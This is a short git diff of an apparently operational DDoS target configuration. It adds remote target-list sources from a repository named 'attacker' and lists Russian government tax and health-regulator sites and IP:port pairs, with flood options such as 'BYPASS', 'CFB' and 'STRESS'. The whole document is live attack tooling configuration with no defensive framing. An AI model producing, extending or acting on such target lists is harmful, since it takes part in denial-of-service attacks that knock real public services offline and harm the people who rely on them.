@@ -64,6 +64,10 @@ http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 ht
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS CFB
 
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods HEAD POST
+
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods HEAD POST
+
 #-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/udp.lst
 
 https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru https://https://lkdr.nalog.gov.ru --http-methods STRESS BYPASS GET
